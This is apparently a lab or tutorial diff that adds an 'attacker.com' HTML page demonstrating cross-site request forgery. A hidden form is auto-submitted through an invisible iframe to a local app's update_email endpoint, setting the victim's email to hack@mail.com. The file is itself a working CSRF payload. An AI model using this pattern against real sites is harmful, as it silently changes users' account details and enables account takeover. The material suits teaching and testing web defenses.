@@ -1,0 +1,18 @@
+<!-- attacker.com -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Example</title>
+</head>
+<body>
+    <h1>Hi Victim</h1>
+    <iframe style="display: none" name="csrf-iframe"></iframe>
+    <form action=" http://127.0.0.1:5000/update_email" method="GET" target="csrf-iframe" id="csrf-form">
+        <input type="hidden" name="email" value="hack@mail.com">
+    </form>
+
+    <script>document.getElementById("csrf-form").submit()</script>
+</body>
+</html>
+
